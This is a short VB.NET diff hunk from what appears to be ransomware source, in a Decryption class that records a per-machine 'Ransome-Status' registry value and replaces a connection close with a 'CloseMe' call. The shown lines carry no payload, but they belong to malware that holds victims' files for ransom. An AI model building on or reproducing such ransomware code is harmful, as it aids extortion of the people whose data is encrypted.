@@ -47,10 +47,10 @@ Public Class Decryption
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", "Decrypted")
 
             Try
-                Main.C.Close()
-                Main.C = Nothing
+                Main.CloseMe()
             Catch ex As Exception
             End Try
+
         Catch ex As Exception
         End Try
 
